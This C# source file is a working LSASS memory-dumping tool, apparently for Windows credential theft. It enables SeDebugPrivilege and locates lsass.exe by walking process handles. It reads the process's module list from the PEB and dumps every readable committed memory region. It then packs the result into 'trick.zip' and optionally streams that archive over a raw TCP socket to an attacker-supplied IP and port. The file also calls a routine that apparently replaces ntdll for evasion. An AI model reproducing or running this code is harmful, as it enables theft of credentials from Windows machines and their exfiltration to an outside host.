using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Diagnostics;
using System.IO.Compression;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using static Trick.NT;

namespace Trick
{
    internal class Program
    {
        public static OSVERSIONINFOEX getBuildNumber()
        {
            OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
            RtlGetVersion(ref osVersionInfo);
            return osVersionInfo;
        }


        public static string ToJson(string[] array)
        {
            string json_str = "{";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += "\"field" + i.ToString() + "\" : \"" + array[i] + "\" , ";
            }
            return (json_str.Substring(0, json_str.Length - 3) + "}");
        }


        public static string ToJsonArray(string[] array)
        {
            string json_str = "[";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += array[i] + ", ";
            }
            return (json_str.Substring(0, json_str.Length - 2) + "]");
        }


        static string Lock()
        {
            OSVERSIONINFOEX osVersionInfo = getBuildNumber();
            string[] aux_array = { osVersionInfo.dwMajorVersion.ToString(), osVersionInfo.dwMinorVersion.ToString(), osVersionInfo.dwBuildNumber.ToString() };
            string aux_array_json = ToJson(aux_array);
            string[] aux_array_1 = { aux_array_json };
            string lock_json_content = ToJsonArray(aux_array_1);
            return lock_json_content;
        }


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        public unsafe static List<ModuleInformation> CustomGetModuleHandle(IntPtr hProcess)
        {
            List<ModuleInformation> moduleInformationList = new List<ModuleInformation>();

            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_fulldllname_offset = 0x40;
            int flink_buffer_offset = 0x50;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));
                // DLL base name
                string base_dll_name = "";
                if (buffer != IntPtr.Zero)
                {
                    base_dll_name = ReadRemoteWStr(hProcess, buffer);
                }
                // DLL full path
                string full_dll_path = ReadRemoteWStr(hProcess, ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_fulldllname_offset)));

                moduleInformationList.Add(new ModuleInformation(base_dll_name.ToLower(), full_dll_path, dll_base, 0));
                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));
            }
            return moduleInformationList;
        }


        public static IntPtr GetProcessByName(string proc_name)
        {
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;

            while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                string current_proc_name = GetProcNameFromHandle(aux_handle);
                if (current_proc_name == proc_name)
                {
                    return aux_handle;
                }
            }
            return IntPtr.Zero;
        }


        unsafe static string GetProcNameFromHandle(IntPtr process_handle)
        {
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int commandline_offset = 0x68;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get PEB->ProcessParameters
            int processparameters_offset = 0x20;
            IntPtr processparameters_pointer = pebaddress + processparameters_offset;

            // Get ProcessParameters->CommandLine
            IntPtr processparameters_adress = ReadRemoteIntPtr(process_handle, processparameters_pointer);
            IntPtr commandline_pointer = processparameters_adress + commandline_offset;
            IntPtr commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
            string commandline_value = ReadRemoteWStr(process_handle, commandline_address);
            return commandline_value;
        }


        static Tuple<string, IntPtr> Shock()
        {
            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle
            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";
            IntPtr processHandle = GetProcessByName(proc_name);
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] It was not possible to get a process handle. If you get 0xC0000022 errors probably PEB is unreadable.");
                Environment.Exit(-1);
            }

            // List to get modules information
            List<ModuleInformation> moduleInformationList = CustomGetModuleHandle(processHandle);

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = IntPtr.Zero;
            int aux_size = 0;
            string aux_name = "";

            while ((long)mem_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                uint ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    ModuleInformation aux_module = moduleInformationList.Find(obj => obj.Name == aux_name);

                    if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.Address)
                    {
                        aux_module.Size = aux_size;
                        int aux_index = moduleInformationList.FindIndex(obj => obj.Name == aux_name);
                        moduleInformationList[aux_index] = aux_module;

                        foreach (ModuleInformation modInfo in moduleInformationList)
                        {
                            if (mbi.BaseAddress == modInfo.Address)
                            {
                                aux_name = modInfo.Name.ToLower();
                                aux_size = (int)mbi.RegionSize;
                            }
                        }
                    }
                    else
                    {
                        aux_size += (int)mbi.RegionSize;
                    }
                }
                // Next memory region
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }

            // Generate JSON
            string[] aux_array_1 = { };
            foreach (ModuleInformation modInfo in moduleInformationList)
            {
                string[] aux_array_2 = { modInfo.Name.ToString(), modInfo.FullPath.ToString().Replace("\\", "\\\\"), ("0x" + modInfo.Address.ToString("X")), modInfo.Size.ToString() };
                aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();

            }
            string shock_json_content = ToJsonArray(aux_array_1);
            return Tuple.Create(shock_json_content, processHandle);
        }


        static string getRandomString(int length, Random random)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            for (int i = 0; i < length; i++)
            {
                int index = random.Next(chars.Length);
                stringBuilder.Append(chars[index]);
            }
            return stringBuilder.ToString();
        }


        static Tuple<string, List<MemFile>> Barrel(IntPtr processHandle)
        {
            // Random seed
            Random random = new Random();

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            List<MemFile> memfile_list = new List<MemFile> { };
            string[] aux_array_1 = { };
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                NtQueryVirtualMemory(processHandle, aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and committed -> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    string memdump_filename = getRandomString(10, random) + "." + getRandomString(3, random);

                    // Add to JSON file                    
                    string[] aux_array_2 = { memdump_filename, "0x" + aux_address.ToString("X"), mbi.RegionSize.ToString() };
                    aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();

                    // Add to global byte array
                    MemFile memFile = new MemFile(memdump_filename, buffer);
                    memfile_list.Add(memFile);
                }
                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }
            // Close process handle
            NtClose(processHandle);

            // Write JSON file
            string barrel_json_content = ToJsonArray(aux_array_1);
            return Tuple.Create(barrel_json_content, memfile_list);
        }


        static void AddStringToZip(System.IO.Compression.ZipArchive archive, string entryName, string content)
        {
            ZipArchiveEntry entry = archive.CreateEntry(entryName);
            using (StreamWriter writer = new StreamWriter(entry.Open()))
            {
                writer.Write(content);
            }
        }


        public static void SendBytes(string ipAddress, string portNumber, MemoryStream memoryStream)
        {
            IPAddress serverAddress = IPAddress.Parse(ipAddress);
            int serverPort = Int32.Parse(portNumber);
            using (Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
            {
                clientSocket.Connect(new IPEndPoint(serverAddress, serverPort));
                memoryStream.Seek(0, SeekOrigin.Begin);
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = memoryStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    clientSocket.Send(buffer, 0, bytesRead, SocketFlags.None);
                }
                clientSocket.Shutdown(SocketShutdown.Both);
            }
        }


        public static void GenerateTrickZip(string zipFilePath, string lock_str, string shock_str, string barrel_str, List<MemFile> barrel_memfiles, string ip_addr, string port)
        {
            // Generate ZIP file
            if (ip_addr == "" || port == "")
            {
                // Check it exists, delete if it does
                if (File.Exists(zipFilePath)) { File.Delete(zipFilePath); }

                using (FileStream zipStream = new FileStream(zipFilePath, FileMode.Create))
                {
                    using (ZipArchive archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
                    {
                        AddStringToZip(archive, "lock.json", lock_str);
                        AddStringToZip(archive, "shock.json", shock_str);
                        AddStringToZip(archive, "barrel.json", barrel_str);
                        ZipArchiveEntry innerZipEntry = archive.CreateEntry("barrel.zip");
                        using (Stream innerZipStream = innerZipEntry.Open())
                        {
                            using (System.IO.Compression.ZipArchive innerArchive = new System.IO.Compression.ZipArchive(innerZipStream, ZipArchiveMode.Create))
                            {
                                foreach (MemFile m in barrel_memfiles)
                                {
                                    ZipArchiveEntry entry = innerArchive.CreateEntry(m.filename, CompressionLevel.Fastest);
                                    using (Stream entryStream = entry.Open())
                                    {
                                        entryStream.Write(m.content, 0, m.content.Length);
                                    }
                                }
                            }
                        }
                    }
                }
                Console.WriteLine("[+] File " + zipFilePath + " generated.");
            }

            // Send ZIP file to remote port
            else {
                using (MemoryStream zipStream = new MemoryStream())
                {
                    using (System.IO.Compression.ZipArchive archive = new System.IO.Compression.ZipArchive(zipStream, ZipArchiveMode.Create, true))
                    {
                        AddStringToZip(archive, "lock.json", lock_str);
                        AddStringToZip(archive, "shock.json", shock_str);
                        AddStringToZip(archive, "barrel.json", barrel_str);
                        ZipArchiveEntry innerZipEntry = archive.CreateEntry("barrel.zip");
                        using (Stream innerZipStream = innerZipEntry.Open())
                        {
                            using (System.IO.Compression.ZipArchive innerArchive = new System.IO.Compression.ZipArchive(innerZipStream, ZipArchiveMode.Create))
                            {
                                foreach (MemFile m in barrel_memfiles)
                                {
                                    ZipArchiveEntry entry = innerArchive.CreateEntry(m.filename, CompressionLevel.Fastest);
                                    using (Stream entryStream = entry.Open())
                                    {
                                        entryStream.Write(m.content, 0, m.content.Length);
                                    }
                                }
                            }
                        }
                        zipStream.Seek(0, SeekOrigin.Begin);
                        SendBytes(ip_addr, port, zipStream);
                        Console.WriteLine("[+] File sent successfully.");
                    }
                }
            }
        }


        static void Main(string[] args)
        {
            // Replace ntdll library
            string ntdll_option = "default";
            string ip_addr = "";
            string port = "";
            if (args.Length >= 1)
            {
                ntdll_option = args[0];
            }
            if (args.Length >= 2)
            {
                ip_addr = args[1];
            }
            if (args.Length >= 3)
            {
                port = args[2];
            }
            ReplaceLibrary(ntdll_option);

            // Check binary is correctly compiled
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] File must be compiled as 64-byte binary.");
                Environment.Exit(-1);
            }

            // 1 - Get OS information. Returns: JSON string
            string lock_str = Lock();

            // 2 - Get modules (ModuleList) information. Returns: JSON string + Process Handle
            var shock_result = Shock();
            string shock_str = shock_result.Item1;
            IntPtr processHandle = shock_result.Item2;

            // 3 - Get Mem64List information + Dump memory regions. Arguments: Lsass process handle. Returns: JSON string and List of MemFile
            var barrel_result = Barrel(processHandle);
            string barrel_str = barrel_result.Item1;
            List<MemFile> barrel_mem = barrel_result.Item2;

            // Generate the final trick.zip
            GenerateTrickZip("trick.zip", lock_str, shock_str, barrel_str, barrel_mem, ip_addr, port);
        }
    }
}